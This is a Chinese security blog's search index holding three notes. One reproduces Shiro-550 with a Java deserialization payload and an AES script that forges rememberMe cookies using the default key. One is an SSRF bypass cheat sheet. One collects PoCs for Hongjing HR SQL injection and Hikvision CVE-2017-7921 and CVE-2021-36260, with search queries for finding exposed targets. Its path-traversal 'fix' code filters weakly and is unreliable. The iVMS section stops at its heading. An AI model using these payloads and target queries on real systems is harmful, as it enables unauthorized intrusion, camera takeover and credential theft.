<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>shiro550分析复现</title>
    <url>/2023/06/12/shiro%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>



<p>找到shiro&#x2F;samples&#x2F;web里面的pom.xml，把jstl的版本改成1.2</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>加一个version</p>
<p>配一下tomcat</p>
<h3 id="看登录逻辑"><a href="#看登录逻辑" class="headerlink" title="看登录逻辑"></a>看登录逻辑</h3><p>看一下登录包</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164707912.png" alt="image-20230612164707912"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164815088.png" alt="image-20230612164815088"></p>
<p>shiro登录逻辑是，点击remmerberme之后</p>
<p>第一个请求的返回会给一串set-cookie，然后你就用这个和他发起请求</p>
<h4 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h4><p>去看源码，找一下cookie</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171725697.png" alt="image-20230612171725697"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171735017.png" alt="image-20230612171735017"></p>
<p>往下看，能看到base64编码</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172015492.png" alt="image-20230612172015492"></p>
<p>看看哪里调用了这个方法</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172106578.png" alt="image-20230612172106578"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172125292.png" alt="image-20230612172125292"></p>
<p>找到这个，</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172603128.png" alt="image-20230612172603128"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172616571.png" alt="image-20230612172616571"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172626606.png" alt="image-20230612172626606"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172644597.png" alt="image-20230612172644597"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172718535.png" alt="image-20230612172718535"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612172725265.png" alt="image-20230612172725265">发现key是常量</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612214512006.png" alt="image-20230612214512006"></p>
<p>iv是随便取的</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>bp起一个监听collaborator (dnslog)，java生成poyload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://y65fxv6rch5rzwh0fcrxf3awangd42.oastify.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    hashCodeField.set(url,<span class="number">1234</span>);</span><br><span class="line">    hashmap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    hashCodeField.set(url,-<span class="number">1</span>);</span><br><span class="line">    serialize(hashmap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python实现aes加密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加密脚本</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="comment"># plaintext = bytes.decode(plaintext)</span></span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># enc_data = b&quot;AALv9ZLoHe8dKEtIeH7y/2i9M9S70eanvsGbaN+DYSInYaw1cjtZvWNhXegmgP2DLI+VHLIxBrahwOUK4XNB2Vr</span></span><br><span class="line">    <span class="comment"># plaintext = aes_dec(enc_data)</span></span><br><span class="line">    <span class="comment"># print(plaintext)</span></span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure>

<p>复制到流量包是不会走到反序列化的流程里的，要把sessionid删掉，不删是这样</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614143021221.png" alt="image-20230614143021221"></p>
<p>删了之后就是这个</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614142555692.png" alt="image-20230614142555692"></p>
<p>回看bp的监听</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614143829553.png" alt="image-20230614143829553"></p>
<p>已经弹回来了</p>
<h3 id="自查检测工具"><a href="#自查检测工具" class="headerlink" title="自查检测工具"></a>自查检测工具</h3><p><a href="https://shiro.sumsec.me/">https://shiro.sumsec.me/</a></p>
<p>参考链接：<a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
<h3 id="cc链（正在写）"><a href="#cc链（正在写）" class="headerlink" title="cc链（正在写）"></a>cc链（正在写）</h3><blockquote>
<p>cc:<a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads</a></p>
</blockquote>
<p>pom添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>











]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf笔记</title>
    <url>/2023/06/12/ssrf%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><h4 id="漏洞出现点"><a href="#漏洞出现点" class="headerlink" title="漏洞出现点"></a>漏洞出现点</h4><h5 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h5><p>通过url 地址分享文章，例如如下地址:</p>
<p><a href="http://share.xxx.com/index.?url=http://127.0.0.1">http://share.xxx.com/index.?url=http://127.0.0.1</a></p>
<p>通过ur参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与</p>
<p>限制则就存在着SSRF漏洞。</p>
<h5 id="图片加载与下载"><a href="#图片加载与下载" class="headerlink" title="图片加载与下载"></a>图片加载与下载</h5><p>通过URL地址加载或下载图片</p>
<p><a href="http://image.xxx.com/image.php?image=http://127.0.0.1">http://image.xxx.com/image.php?image=http://127.0.0.1</a></p>
<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF</p>
<h5 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h5><p><a href="http://title.xxx.com/title?title=file://etc/passwd">http://title.xxx.com/title?title=file://etc/passwd</a></p>
<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF.</p>
<p><strong>代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS,xml,</strong></p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器发送的，从而来判断是否存在SSRF漏洞。，</p>
<p>如果网站访问的百度页面，抓包的内容组并没有请求百度，那就说明请求是由服务器发出的，存在ssrf漏洞</p>
<h5 id="SSRF常用协议"><a href="#SSRF常用协议" class="headerlink" title="SSRF常用协议"></a>SSRF常用协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///  看文件，端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">dict://   端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">sftp://  传输</span><br><span class="line"></span><br><span class="line">ftp://</span><br><span class="line"></span><br><span class="line">tftp://  </span><br><span class="line"></span><br><span class="line">ldap://  轻量级目录访问</span><br><span class="line"></span><br><span class="line">gopher://   万金油</span><br></pre></td></tr></table></figure>

<h5 id="常见触发参数名"><a href="#常见触发参数名" class="headerlink" title="常见触发参数名"></a>常见触发参数名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">share	wap	url	link	src	source</span><br><span class="line"></span><br><span class="line">target	u	3g	display	sourceURI</span><br><span class="line"></span><br><span class="line">imageURL	domain</span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><strong>@绕过</strong> </p>
<p><a href="http://www.cbaidu/">http://www.baidu</a><a href="mailto:&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a>:8080</p>
<p><strong>ip地址转换成进制</strong>绕过</p>
<p>ping 2130706433</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35329361/1685932689118-1545318e-a582-4769-b926-3bb6b69527ad.png" alt="img"></p>
<p>127.0.0.1先转换成2进制，去掉小数点在转回十进制</p>
<p><strong>302 redirect</strong>绕过</p>
<p>当url存在临时(302)永久(301)跳转时，则继续请求跳转后的url，那么我们可以通过http的连接302跳转到gopher协议上</p>
<p>ssrf限制只能用http或者https协议时，可以通过header函数绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:file:///etc/passwd&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:dict://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:gopher://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xip.io</strong>绕过</p>
<p>dns解析这个host时会自动去掉后缀</p>
<p><a href="http://10.0.0.1.xip.io/">http://10.0.0.1.xip.io</a> &#x3D; 10.0.0.1</p>
<p><a href="http://www.10.0.0.1.xip.io/">www.10.0.0.1.xip.io</a>   &#x3D; 10.0.0.1</p>
<p><a href="http://mysite.10.0.0.1.xip.io=10.0.0.1">http://mysite.10.0.0.1.xip.io=10.0.0.1</a></p>
<p>foo.<a href="http://bar.10.0.0.1.xip.io/">http://bar.10.0.0.1.xip.io</a> &#x3D;10.0.0.1</p>
<p>10.0.0.1.xip.name resolves to 10.0.0.1</p>
<p><a href="http://www.10.0.0.2.xip.name/">www.10.0.0.2.xip.name</a> resolves to 10.0.0.2</p>
<p>foo.10.0.0.3.xip.name resolves to 10.0.0.3</p>
<p>bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</p>
<p><strong>封闭式字母数字</strong>绕过</p>
<p> ⓗ  ⓣ   ⓣ  Ⓟ  Ⓔ      &#x3D; <a href="http://example.com/">http://example.com</a></p>
<p>封闭式字母数字网址 <a href="https://haomeili.net/ZhiShi/34">https://haomeili.net/ZhiShi/34</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">diverse = <span class="string">&#x27;&#x27;&#x27;①②③④⑤⑥⑦⑧⑨⑴⑵⑶⑷⑸⑹⑺⑻⑼⒈⒉⒊⒋⒌⒍⒎⒏⒐⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓵⓶⓷⓸⓹⓺⓻⓼⓽&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">general = <span class="string">&#x27;&#x27;&#x27;123456789123456789123456789abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 创建转换表</span></span><br><span class="line">decode = <span class="built_in">str</span>.maketrans(diverse, general)</span><br><span class="line">encode = <span class="built_in">str</span>.maketrans(general, diverse)</span><br><span class="line"><span class="comment"># 定义一个字符串</span></span><br><span class="line">text = <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line"><span class="comment"># 使用转换表进行加密</span></span><br><span class="line">new_text = text.translate(encode)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(new_text)</span><br></pre></td></tr></table></figure>

<p> <strong>DNS rebinding</strong>  </p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞复现</title>
    <url>/2023/06/13/%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="OA系统"><a href="#OA系统" class="headerlink" title="OA系统"></a>OA系统</h3><h4 id="宏景HR系统-CNVD-2023-08743"><a href="#宏景HR系统-CNVD-2023-08743" class="headerlink" title="宏景HR系统 CNVD-2023-08743"></a>宏景HR系统 CNVD-2023-08743</h4><h5 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body = &#x27;&lt;div class=&quot;hj-hy-all-one-logo&quot;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/servlet/codesettree?categories=（Hrms编码之后的sql语句）&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>hrms加解密工具 <a href="https://github.com/vaycore/HrmsTool">https://github.com/vaycore/HrmsTool</a></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613105103117.png" alt="image-20230613105103117"></p>
<p>java -jar hrmsTool.jar -e  “1’ union all select ‘hongjing’,@@version–”</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1 HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651655167.png" alt="1686651655167"></p>
<h4 id="cve-2017-7921-x2F-7923"><a href="#cve-2017-7921-x2F-7923" class="headerlink" title="cve-2017-7921&#x2F;7923"></a>cve-2017-7921&#x2F;7923</h4><p><strong>影响范围</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651720225.png" alt="1686651720225"></p>
<p><strong>排查步骤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/Security/users?auth=YWRtaW46MTEKYWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>auth内容是admin:11的base64编码。</p>
<p>获取系统监控快照，不需要进行身份验证。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/onvif-http/snapshot?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>下载摄像机配置文件，通过脚本解密配置文件获得账密信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/System/configurationFile?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>用hex编辑器打开下载的configurationFile文件发现是加密后的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor</span><br><span class="line">python3 decrypt_configurationFile.py configurationFile</span><br></pre></td></tr></table></figure>

<h4 id="cve-2021-36260"><a href="#cve-2021-36260" class="headerlink" title="cve-2021-36260"></a>cve-2021-36260</h4><p>影响范围</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img640" alt="图片"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652093950.png" alt="1686652093950"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652112690.png" alt="1686652112690"></p>
<p>漏洞poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUT /SDK/webLanguage HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line">AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 89</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;language&gt;$(ifconfig -a &gt;</span><br><span class="line">webLib/dd.asp)&lt;/language&gt;</span><br></pre></td></tr></table></figure>

<h4 id="海康威视流媒体管理服务器后台任意文件读取漏洞"><a href="#海康威视流媒体管理服务器后台任意文件读取漏洞" class="headerlink" title="海康威视流媒体管理服务器后台任意文件读取漏洞"></a>海康威视流媒体管理服务器后台任意文件读取漏洞</h4><p><strong>影响范围</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">流媒体管理服务器 V2.3.5</span><br></pre></td></tr></table></figure>

<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.title=&quot;流媒体管理服务器&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini</span><br></pre></td></tr></table></figure>

<p>fileName未输入文件名时，返回包会报错，错误信息中包含网站的部分绝对路径信息，经过路径构造可以获取当前php文件的内容</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652380656.png" alt="1686652380656"></p>
<p>漏洞修复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>php.ini 配置 open_basedir（针对PHP应用程序）。</span><br><span class="line"><span class="number">2.</span>用户输入配置白名单，对文件下载类型进行检查，判断是否为允许下载类型。</span><br><span class="line"><span class="number">3.</span>过滤路径回溯符../，或者直接将..替换成空。对参数进行过滤，依次过滤“.”、“..”、“/”、“\”等字符。</span><br><span class="line"><span class="number">4.</span>对于下载文件的目录做好限制，只能下载定目录下的文件，或者将要下载的资源文件路径存入数据库，附件下载时定数据库中的id即可，id即对应的资源。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileReader</span> &#123;</span><br><span class="line">    <span class="comment">// 正则表达式，用于过滤路径中的 ../ 字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">SAFE_PATH_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;[^/]+/\\.\\./&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全读取文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] readSafely(String path) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 将路径中的 ../ 替换为空字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">safePath</span> <span class="operator">=</span> SAFE_PATH_PATTERN.matcher(path).replaceAll(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用安全路径读取文件</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">filePath</span> <span class="operator">=</span> Paths.get(safePath);</span><br><span class="line">        <span class="keyword">return</span> Files.readAllBytes(filePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">这段代码中使用了正则表达式来过滤路径中的 ../ 字符串，确保文件只能被读取到预期的位置。</span><br><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] fileData = FileReader.readSafely(<span class="string">&quot;/path/to/file&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="comment">// 处理异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="海康威视iVMS综合安防系统任意文件上传漏洞（0day）"><a href="#海康威视iVMS综合安防系统任意文件上传漏洞（0day）" class="headerlink" title="海康威视iVMS综合安防系统任意文件上传漏洞（0day）"></a><strong>海康威视iVMS综合安防系统任意文件上传漏洞（0day）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视iVMS系统存在在野 0day 漏洞，攻击者通过获取密钥任意构造token，请求&#x2F;resourceOperations&#x2F;upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。</p>
<p><strong>影响范围</strong></p>
<p>1.海康威视综合安防系统iVMS-5000</p>
<p>2.海康威视综合安防系统 iVMS-8700</p>
<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.body=&quot;/views/home/file/installPackage.rar&quot;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞poc</strong></p>
